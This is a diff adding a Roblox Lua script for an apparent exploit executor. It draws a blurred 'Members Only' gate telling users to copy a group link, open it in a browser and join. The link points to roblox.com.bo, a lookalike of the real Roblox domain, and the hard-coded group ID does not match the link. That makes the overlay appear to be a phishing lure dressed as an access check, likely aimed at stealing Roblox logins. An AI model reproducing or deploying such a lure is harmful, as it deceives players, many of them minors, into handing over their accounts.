@@ -1,0 +1,265 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+
+local GROUP_ID = 215154644959
+local GROUP_LINK = "https://roblox.com.bo/communities/7368983769/"
+
+if player:IsInGroup(GROUP_ID) then return end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AccessUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+local Blur = Instance.new("BlurEffect")
+Blur.Size = 0
+Blur.Parent = game:GetService("Lighting")
+
+local Backdrop = Instance.new("Frame")
+Backdrop.Size = UDim2.new(1, 0, 1, 0)
+Backdrop.BackgroundColor3 = Color3.fromRGB(10, 0, 20)
+Backdrop.BackgroundTransparency = 1
+Backdrop.ZIndex = 1
+Backdrop.Parent = ScreenGui
+
+local Card = Instance.new("Frame")
+Card.Size = UDim2.new(0, 360, 0, 320)
+Card.Position = UDim2.new(0.5, -180, 0.5, 30)
+Card.BackgroundColor3 = Color3.fromRGB(70, 20, 160)
+Card.BackgroundTransparency = 1
+Card.BorderSizePixel = 0
+Card.ZIndex = 2
+Card.Parent = ScreenGui
+Instance.new("UICorner", Card).CornerRadius = UDim.new(0, 20)
+
+local GlassGrad = Instance.new("UIGradient")
+GlassGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 30, 195)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 8, 105))
+})
+GlassGrad.Rotation = 135
+GlassGrad.Parent = Card
+
+local Border = Instance.new("UIStroke")
+Border.Color = Color3.fromRGB(170, 90, 255)
+Border.Thickness = 1.5
+Border.Transparency = 0.15
+Border.Parent = Card
+
+local TopShimmer = Instance.new("Frame")
+TopShimmer.Size = UDim2.new(0.75, 0, 0, 1)
+TopShimmer.Position = UDim2.new(0.125, 0, 0, 1)
+TopShimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TopShimmer.BackgroundTransparency = 0.5
+TopShimmer.BorderSizePixel = 0
+TopShimmer.ZIndex = 5
+TopShimmer.Parent = Card
+Instance.new("UICorner", TopShimmer).CornerRadius = UDim.new(0, 2)
+
+local Accent = Instance.new("Frame")
+Accent.Size = UDim2.new(1, 0, 0, 3)
+Accent.BackgroundColor3 = Color3.fromRGB(180, 80, 255)
+Accent.BorderSizePixel = 0
+Accent.ZIndex = 3
+Accent.Parent = Card
+Instance.new("UICorner", Accent).CornerRadius = UDim.new(0, 20)
+
+local AccentGrad = Instance.new("UIGradient")
+AccentGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 200)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(210, 110, 255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 200))
+})
+AccentGrad.Parent = Accent
+
+local Shadow = Instance.new("ImageLabel")
+Shadow.Image = "rbxassetid://6014261993"
+Shadow.ImageColor3 = Color3.fromRGB(110, 0, 255)
+Shadow.ImageTransparency = 0.45
+Shadow.ScaleType = Enum.ScaleType.Slice
+Shadow.SliceCenter = Rect.new(49, 49, 450, 450)
+Shadow.Size = UDim2.new(1, 80, 1, 80)
+Shadow.Position = UDim2.new(0, -40, 0, -40)
+Shadow.BackgroundTransparency = 1
+Shadow.ZIndex = 1
+Shadow.Parent = Card
+
+-- Icon
+local Icon = Instance.new("TextLabel")
+Icon.Text = "🔒"
+Icon.Size = UDim2.new(0, 36, 0, 36)
+Icon.Position = UDim2.new(0.5, -18, 0, 14)
+Icon.BackgroundTransparency = 1
+Icon.TextColor3 = Color3.fromRGB(255, 255, 255)
+Icon.Font = Enum.Font.GothamBold
+Icon.TextSize = 26
+Icon.TextXAlignment = Enum.TextXAlignment.Center
+Icon.ZIndex = 5
+Icon.Parent = Card
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Text = "Members Only!"
+Title.Size = UDim2.new(1, -30, 0, 32)
+Title.Position = UDim2.new(0, 15, 0, 52)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 22
+Title.TextXAlignment = Enum.TextXAlignment.Center
+Title.ZIndex = 5
+Title.Parent = Card
+
+-- Subtitle
+local Sub = Instance.new("TextLabel")
+Sub.Text = "This script is exclusive to group members.\nJoin our group to unlock full access!"
+Sub.Size = UDim2.new(1, -30, 0, 40)
+Sub.Position = UDim2.new(0, 15, 0, 84)
+Sub.BackgroundTransparency = 1
+Sub.TextColor3 = Color3.fromRGB(210, 190, 255)
+Sub.Font = Enum.Font.Gotham
+Sub.TextSize = 13
+Sub.TextWrapped = true
+Sub.TextXAlignment = Enum.TextXAlignment.Center
+Sub.LineHeight = 1.4
+Sub.ZIndex = 5
+Sub.Parent = Card
+
+-- Divider
+local Div = Instance.new("Frame")
+Div.Size = UDim2.new(0.85, 0, 0, 1)
+Div.Position = UDim2.new(0.075, 0, 0, 132)
+Div.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Div.BackgroundTransparency = 0.75
+Div.BorderSizePixel = 0
+Div.ZIndex = 5
+Div.Parent = Card
+
+local DivGrad = Instance.new("UIGradient")
+DivGrad.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0))
+})
+DivGrad.Parent = Div
+
+-- How to join label
+local HowTo = Instance.new("TextLabel")
+HowTo.Text = "HOW TO JOIN"
+HowTo.Size = UDim2.new(1, -30, 0, 18)
+HowTo.Position = UDim2.new(0, 15, 0, 142)
+HowTo.BackgroundTransparency = 1
+HowTo.TextColor3 = Color3.fromRGB(180, 120, 255)
+HowTo.Font = Enum.Font.GothamBold
+HowTo.TextSize = 11
+HowTo.TextXAlignment = Enum.TextXAlignment.Left
+HowTo.ZIndex = 5
+HowTo.Parent = Card
+
+-- Steps
+local steps = {
+	{icon = "①", text = "Click Copy link below"},
+	{icon = "②", text = "Open the link in your browser"},
+	{icon = "③", text = "Press Join Group on the page"},
+	{icon = "④", text = "Return here — access unlocks!"},
+}
+
+for i, s in ipairs(steps) do
+	local Row = Instance.new("Frame")
+	Row.Size = UDim2.new(1, -30, 0, 22)
+	Row.Position = UDim2.new(0, 15, 0, 160 + (i-1) * 24)
+	Row.BackgroundTransparency = 1
+	Row.ZIndex = 5
+	Row.Parent = Card
+
+	local Num = Instance.new("TextLabel")
+	Num.Text = s.icon
+	Num.Size = UDim2.new(0, 22, 1, 0)
+	Num.BackgroundTransparency = 1
+	Num.TextColor3 = Color3.fromRGB(200, 140, 255)
+	Num.Font = Enum.Font.GothamBold
+	Num.TextSize = 13
+	Num.TextXAlignment = Enum.TextXAlignment.Left
+	Num.ZIndex = 5
+	Num.Parent = Row
+
+	local Txt = Instance.new("TextLabel")
+	Txt.Text = s.text
+	Txt.Size = UDim2.new(1, -26, 1, 0)
+	Txt.Position = UDim2.new(0, 24, 0, 0)
+	Txt.BackgroundTransparency = 1
+	Txt.TextColor3 = Color3.fromRGB(235, 225, 255)
+	Txt.Font = Enum.Font.Gotham
+	Txt.TextSize = 13
+	Txt.TextXAlignment = Enum.TextXAlignment.Left
+	Txt.ZIndex = 5
+	Txt.Parent = Row
+end
+
+-- Copy Button
+local Btn = Instance.new("TextButton")
+Btn.Text = "🔗  Copy Group Link"
+Btn.Size = UDim2.new(0.82, 0, 0, 46)
+Btn.Position = UDim2.new(0.09, 0, 0, 262)
+Btn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+Btn.Font = Enum.Font.GothamBold
+Btn.TextSize = 15
+Btn.BorderSizePixel = 0
+Btn.ZIndex = 5
+Btn.Parent = Card
+Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 12)
+
+local BtnStroke = Instance.new("UIStroke")
+BtnStroke.Color = Color3.fromRGB(255, 255, 255)
+BtnStroke.Thickness = 1.5
+BtnStroke.Transparency = 0.55
+BtnStroke.Parent = Btn
+
+Btn.MouseEnter:Connect(function()
+	TweenService:Create(Btn, TweenInfo.new(0.15), {
+		BackgroundColor3 = Color3.fromRGB(160, 65, 255)
+	}):Play()
+	TweenService:Create(BtnStroke, TweenInfo.new(0.15), {Transparency = 0.2}):Play()
+end)
+
+Btn.MouseLeave:Connect(function()
+	TweenService:Create(Btn, TweenInfo.new(0.15), {
+		BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+	}):Play()
+	TweenService:Create(BtnStroke, TweenInfo.new(0.15), {Transparency = 0.55}):Play()
+end)
+
+Btn.MouseButton1Click:Connect(function()
+	TweenService:Create(Btn, TweenInfo.new(0.07), {
+		Size = UDim2.new(0.79, 0, 0, 42)
+	}):Play()
+	task.wait(0.07)
+	TweenService:Create(Btn, TweenInfo.new(0.12, Enum.EasingStyle.Back), {
+		Size = UDim2.new(0.82, 0, 0, 46)
+	}):Play()
+
+	if setclipboard then
+		setclipboard(GROUP_LINK)
+		Btn.Text = "✓  Link Copied!"
+		Btn.TextColor3 = Color3.fromRGB(160, 255, 190)
+		task.delay(2.5, function()
+			Btn.Text = "🔗  Copy Group Link"
+			Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+		end)
+	else
+		Btn.Text = "Not supported ⚠"
+	end
+end)
+
+-- Entrance
+TweenService:Create(Backdrop, TweenInfo.new(0.35), {BackgroundTransparency = 0.45}):Play()
+TweenService:Create(Blur, TweenInfo.new(0.45), {Size = 14}):Play()
+task.wait(0.1)
+TweenService:Create(Card, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+	Position = UDim2.new(0.5, -180, 0.5, -160),
+	BackgroundTransparency = 0.2
+}):Play()
